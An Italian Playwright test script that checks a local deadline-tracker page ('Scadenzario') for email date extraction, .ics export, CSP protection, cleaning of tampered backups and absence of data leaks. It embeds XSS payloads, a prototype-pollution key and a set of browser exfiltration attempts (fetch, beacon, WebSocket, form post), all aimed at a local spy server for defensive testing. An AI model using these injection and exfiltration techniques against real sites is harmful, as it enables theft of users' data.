// Verifica di scadenzario.html:
//  1. estrazione dalle email di prova ed esportazione .ics;
//  2. protezioni: impronta dello script, codice estraneo bloccato, backup manipolati ripuliti;
//  3. nessuna fuga di dati: un server "spia" su 127.0.0.1 registra ogni contatto; una pagina di controllo senza
//     protezioni dimostra che il test rileva le fughe, poi gli stessi tentativi vengono eseguiti dentro lo Scadenzario.
// Uso: node verifica-pagina.js     (richiede Playwright)
'use strict';
const http = require('http'), fs = require('fs'), path = require('path'), os = require('os');
const { chromium } = require('playwright');
const QUI = __dirname, PAGINA = 'file://' + path.resolve(QUI, '..', 'scadenzario.html');
let falliti = 0;
const ok = (nome, cond, dettaglio) => { if (!cond) falliti++; console.log((cond ? 'OK   ' : 'FAIL ') + nome + (!cond && dettaglio ? '\n     ' + dettaglio : '')); };

(async () => {
  const browser = await chromium.launch({ args: ['--no-proxy-server'] });

  /* ---------- 1. Estrazione ed esportazione ---------- */
  const ctx = await browser.newContext({ acceptDownloads: true });
  const page = await ctx.newPage();
  const errori = []; page.on('pageerror', e => errori.push(e.message));
  await page.clock.setFixedTime(new Date('2026-11-20T09:00:00+01:00'));
  await page.goto(PAGINA);
  ok('lo script autorizzato dall\'impronta viene eseguito', await page.evaluate(() => typeof window.Scadenzario === 'object'));
  await page.setInputFiles('#fileInput', ['avvocatura.eml', 'pec.eml', 'sindacato.eml'].map(f => path.join(QUI, 'email', f)));
  await page.waitForSelector('#reviewPanel:not([hidden])');
  const scelte = await page.$$eval('.cand[data-c]', cs => cs.filter(c => c.querySelector('[data-f=sel]').checked)
    .map(c => [c.querySelector('[data-f=dateStr]').value, c.querySelector('[data-f=time]').value, c.querySelector('[data-f=category]').value].join(' ')));
  ok('scadenze preselezionate dalle 3 email di prova', JSON.stringify(scelte) === JSON.stringify([
    '2026-12-10  contenzioso', '2027-01-15 10:30 udienza', '2026-12-03 15:00 riunione', '2026-12-17  liquidazioni',
    '2026-11-23  sindacato', '2026-11-27  sindacato']), JSON.stringify(scelte));
  ok('PEC: analizzato il messaggio originale, non la ricevuta del gestore', (await page.textContent('#review')).includes('PEC (analizzato il messaggio originale)'));
  await page.click('#addSelected');
  await page.click('nav button[data-tab=impostazioni]');
  const [dl] = await Promise.all([page.waitForEvent('download'), page.click('#icsAll')]);
  const ics = fs.readFileSync(await dl.path(), 'utf8');
  ok('file .ics: 6 eventi, promemoria, righe entro 75 byte', (ics.match(/BEGIN:VEVENT/g) || []).length === 6 && /TRIGGER:-P3D/.test(ics)
    && ics.split('\r\n').every(l => Buffer.byteLength(l, 'utf8') <= 75));

  /* ---------- 2. Protezioni ---------- */
  ok('correttore, traduzione e completamento automatico disattivati', await page.evaluate(() => document.documentElement.getAttribute('translate') === 'no'
    && ['#pText', '#pSubject', '#eTitle', '#eNotes', '#fText'].every(s => document.querySelector(s).spellcheck === false && document.querySelector(s).autocomplete === 'off')));
  ok('nessun blocco durante l\'uso normale', await page.evaluate(() => Scadenzario.cspBlocked.length === 0));
  await page.evaluate(() => document.body.insertAdjacentHTML('beforeend', '<img src="data:," onerror="window.__eseguito=1">'));
  await page.waitForTimeout(300);
  ok('codice in linea inserito nella pagina: non eseguito e segnalato', await page.evaluate(() => window.__eseguito === undefined && Scadenzario.cspBlocked.some(b => /script-src/.test(b))));
  const malevolo = { events: [
    { id: '"><img src=x onerror="window.__eseguito=2">', title: '<img src=x onerror="window.__eseguito=3">', date: '2026-12-01', time: '<b onmouseover=alert(1)>10:00', category: '<script>' },
    { id: 'abcdef123', title: 'data impossibile', date: '2026-02-30' },
    { id: 'abcdef456', title: 'valida', date: '2026-12-02', time: '09:30', category: 'udienza', done: 'si' }],
    imported: { '__proto__': { x: 1 }, k: 5, z: 'testo' } };
  const fileBackup = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'backup-')), 'backup.json');
  fs.writeFileSync(fileBackup, JSON.stringify(malevolo));
  await page.setInputFiles('#bkFile', fileBackup);
  await page.waitForTimeout(300);
  await page.click('nav button[data-tab=calendario]'); await page.click('#nextM'); await page.click('nav button[data-tab=elenco]');
  await page.waitForTimeout(300);
  const importate = await page.evaluate(() => Scadenzario.store.events.filter(e => e.date === '2026-12-01' || e.date === '2026-12-02' || e.title === 'data impossibile'));
  ok('backup manipolato: nessun codice eseguito', await page.evaluate(() => window.__eseguito === undefined));
  ok('backup manipolato: data impossibile scartata, campi ripuliti', importate.length === 2 && importate.every(e => /^[a-z0-9]+$/i.test(e.id))
    && importate[0].time === '' && importate[0].category === 'scadenza' && importate[1].done === false, JSON.stringify(importate));
  ok('errori JavaScript', errori.length === 0, errori.join('; '));
  await ctx.close();

  /* ---------- 3. Nessuna fuga di dati ---------- */
  const contatti = [];
  const srv = http.createServer((req, res) => { contatti.push(req.method + ' ' + req.url); res.end('ok'); });
  srv.on('upgrade', (req, sock) => { contatti.push('WEBSOCKET ' + req.url); sock.destroy(); });
  await new Promise(r => srv.listen(0, '127.0.0.1', r));
  const U = 'http://127.0.0.1:' + srv.address().port;
  const tentativi = `(() => {
    const U = ${JSON.stringify(U)};
    document.body.insertAdjacentHTML('beforeend', '<img src="' + U + '/img"><div style="width:5px;height:5px;background:url(' + U + '/css-bg)"></div>'
      + '<link rel="stylesheet" href="' + U + '/css-link"><link rel="prefetch" href="' + U + '/prefetch"><iframe src="' + U + '/iframe"></iframe>'
      + '<video src="' + U + '/video"></video><form id="lf" method="post" action="' + U + '/form"><input name="x" value="dati"></form>');
    try { fetch(U + '/fetch?dati=segreti').catch(() => {}); } catch (e) {}
    try { const x = new XMLHttpRequest(); x.open('GET', U + '/xhr'); x.send(); } catch (e) {}
    try { navigator.sendBeacon(U + '/beacon', 'dati'); } catch (e) {}
    try { new WebSocket(U.replace('http', 'ws') + '/ws'); } catch (e) {}
    try { new EventSource(U + '/sse'); } catch (e) {}
    try { document.getElementById('lf').submit(); } catch (e) {}
  })()`;
  async function prova(url) {
    contatti.length = 0;
    const p = await browser.newPage();
    await p.goto(url);
    await p.evaluate(tentativi).catch(() => {});
    await p.waitForTimeout(2500);
    await p.close();
    return contatti.slice();
  }
  const controllo = path.join(fs.mkdtempSync(path.join(os.tmpdir(), 'controllo-')), 'controllo.html');
  fs.writeFileSync(controllo, '<!doctype html><meta charset="utf-8"><title>controllo</title><body>pagina senza protezione</body>');
  const daControllo = await prova('file://' + controllo);
  const daScadenzario = await prova(PAGINA);
  ok(`controllo positivo: la pagina senza protezione fa uscire dati (${daControllo.length} contatti ricevuti)`, daControllo.length >= 10, JSON.stringify(daControllo));
  ok('Scadenzario: nessun contatto ricevuto dal server, con gli stessi tentativi eseguiti al suo interno', daScadenzario.length === 0, JSON.stringify(daScadenzario));
  srv.close();
  await browser.close();
  console.log(falliti ? `\n${falliti} verifiche NON superate` : '\nTutte le verifiche superate');
  process.exit(falliti ? 1 : 0);
})();
